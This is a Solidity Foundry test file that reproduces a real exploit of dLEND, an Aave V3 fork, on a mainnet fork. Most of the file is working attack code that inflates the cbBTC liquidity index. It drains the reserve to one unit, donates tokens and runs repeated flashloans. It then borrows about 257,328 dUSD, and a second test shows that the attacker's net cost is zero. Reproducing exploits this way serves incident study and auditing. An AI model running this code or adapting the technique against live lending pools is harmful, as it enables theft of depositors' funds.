// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~257,328 US$ (dUSD)
// Attacker : 0x08cfdff8ded5f1326628077f38d4f90df6417fd9
// Attack Contract : 0xba5e1e36b0305772d35509c694782fb9118d4ecc
// Attack Tx1 (index inflation) : 0x8d33d688def03551cb77b0463f55ae5a670f5ebf3bbb5b8aa0e284c040ae7139
// Attack Tx2 (borrow/extraction) : 0xbec4c8ae19c44990984fd41dc7dd1c9a22894adccf31ca6b61b5aa084fc33260

// @Analysis
// Verichains : https://blog.verichains.io/p/deep-dive-into-the-dtribity-cbbtc

// @Summary
// dLEND is an Aave V3.0.x fork. FlashLoanLogic._handleFlashLoanRepayment books the
// flashloan premium into the reserve index via ReserveLogic.cumulateToLiquidityIndex,
// which divides the premium by aToken.totalSupply(). The attacker drains the cbBTC
// reserve to one scaled unit, donates cbBTC to the aToken (raw transfer, mints no
// shares, so totalSupply() stays ~1), and runs ~150 escalating flashloans whose premiums
// compound the index from 1e27 to 6226621999999999999999999979728276. At that index
// withdraw() burns ~0 scaled shares but moves real cbBTC, so collateral is deposited,
// dUSD borrowed, and the collateral drained back out. Inherited verbatim from pre-V3.1
// Aave (no virtualUnderlyingBalance in the ReserveData struct).

interface IPool {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
    function flashLoan(
        address receiverAddress, address[] calldata assets, uint256[] calldata amounts,
        uint256[] calldata interestRateModes, address onBehalfOf, bytes calldata params, uint16 referralCode
    ) external;
    function getReserveNormalizedIncome(address asset) external view returns (uint256);
}

contract dTRINITYdLEND_exp is BaseTestWithBalanceLog {
    IPool internal constant POOL = IPool(0x6598DaD18Bda89A0E58A1F427c8CeBc0dE90F153);
    IERC20 internal constant cbBTC = IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);
    IERC20 internal constant dUSD = IERC20(0x07fFf99e1664d9B116fbC158c0E99785F81cA236);
    address internal constant A_CBBTC = 0x504D0Eacbf9ea5645A8A9da1b15f3708A5483AcC;

    // getReserveNormalizedIncome(cbBTC) read on-chain at block 24676808.
    uint256 internal constant ONCHAIN_INDEX_AFTER = 6226621999999999999999999979728276;

    function setUp() public {
        vm.createSelectFork("mainnet", 24676807); // one block before the index-manipulation tx
        fundingToken = address(dUSD);
    }

    // Reproduces the attack from its on-chain primitive: the real 150-flashloan inflation
    // loop reaches the on-chain index exactly, then borrows dUSD within the LTV bound.
    function testExploit() public balanceLog {
        deal(address(cbBTC), address(this), 5e9); // working capital (attacker used a Morpho flashloan)
        cbBTC.approve(address(POOL), type(uint256).max);

        POOL.deposit(address(cbBTC), 100, address(this), 0);
        POOL.withdraw(address(cbBTC), 99, address(this)); // leave 1 scaled unit
        cbBTC.transfer(A_CBBTC, 8e7); // seed flashloan liquidity, mints no shares

        uint256 i;
        for (i = 0; i < 400; i++) {
            if (POOL.getReserveNormalizedIncome(address(cbBTC)) >= ONCHAIN_INDEX_AFTER) break;
            _flash(cbBTC.balanceOf(A_CBBTC)); // each premium compounds the index
        }
        emit log_named_uint("flashloans run", i);
        assertEq(POOL.getReserveNormalizedIncome(address(cbBTC)), ONCHAIN_INDEX_AFTER, "index != on-chain value");

        POOL.deposit(address(cbBTC), 772101004, address(this), 0);
        POOL.setUserUseReserveAsCollateral(address(cbBTC), true);
        uint256 borrowAmt = 257328632216555425511184; // ~257,328 dUSD, the reported loss
        assertLe(borrowAmt, _ltvBoundedBorrow(772101004), "borrow exceeded LTV bound");
        POOL.borrow(address(dUSD), borrowAmt, 2, 0, address(this));
    }

    // Full-attack net cbBTC, measured: both drain loops recover the donation+premiums and
    // the collateral, so the attacker ends with ~0 cbBTC spent plus the full dUSD.
    function testNetCostIsZero() public {
        deal(address(cbBTC), address(this), 5e9);
        cbBTC.approve(address(POOL), type(uint256).max);
        uint256 cbStart = cbBTC.balanceOf(address(this));

        POOL.deposit(address(cbBTC), 100, address(this), 0);
        POOL.withdraw(address(cbBTC), 99, address(this));
        cbBTC.transfer(A_CBBTC, 8e7);
        for (uint256 i = 0; i < 400; i++) {
            if (POOL.getReserveNormalizedIncome(address(cbBTC)) >= ONCHAIN_INDEX_AFTER) break;
            _flash(cbBTC.balanceOf(A_CBBTC));
        }
        _drain(15, 12453242, 6217042); // tx1: recover donation + premiums

        POOL.deposit(address(cbBTC), 772101004, address(this), 0);
        POOL.setUserUseReserveAsCollateral(address(cbBTC), true);
        POOL.borrow(address(dUSD), 257328632216555425511184, 2, 0, address(this));
        _drain(126, 12453242, 7845642); // tx2: recover the collateral; nets 0 cbBTC

        int256 netCb = int256(cbBTC.balanceOf(address(this))) - int256(cbStart);
        emit log_named_int("full-attack net cbBTC (wei)", netCb);
        emit log_named_decimal_uint("dUSD kept", dUSD.balanceOf(address(this)), 18);
        assertLt(_abs(netCb), 1e6, "net cbBTC should be ~0");
        assertEq(dUSD.balanceOf(address(this)), 257328632216555425511184, "should keep full dUSD");
    }

    function _drain(uint256 pairs, uint256 first, uint256 last) internal {
        POOL.deposit(address(cbBTC), first, address(this), 0);
        for (uint256 i = 0; i < pairs; i++) {
            POOL.withdraw(address(cbBTC), 9339930, address(this));
            POOL.deposit(address(cbBTC), 3175576, address(this), 0);
        }
        POOL.withdraw(address(cbBTC), last, address(this));
    }

    // LTV-bounded max dUSD borrow, from on-chain config/prices at block 24676808.
    function _ltvBoundedBorrow(uint256 cbBtcAmount) internal pure returns (uint256) {
        uint256 ltvBps = 7300; // getConfiguration(cbBTC) bits 0-15
        uint256 cbPrice = 7372473744858; // oracle.getAssetPrice(cbBTC), 8dp USD
        uint256 dPrice = 1e8; // oracle.getAssetPrice(dUSD)
        uint256 collUsd = cbBtcAmount * cbPrice / 1e8;
        return collUsd * ltvBps / 10000 * 1e18 / dPrice;
    }

    function _flash(uint256 amount) internal {
        address[] memory a = new address[](1);
        uint256[] memory amt = new uint256[](1);
        uint256[] memory m = new uint256[](1);
        a[0] = address(cbBTC); amt[0] = amount; m[0] = 0;
        POOL.flashLoan(address(this), a, amt, m, address(this), "", 0);
    }

    function _abs(int256 x) internal pure returns (uint256) { return x < 0 ? uint256(-x) : uint256(x); }

    // dLEND (Aave V3) flashloan receiver: pool pulls amount+premium via the max approval.
    function executeOperation(address[] calldata, uint256[] calldata, uint256[] calldata, address, bytes calldata)
        external pure returns (bool) { return true; }
}
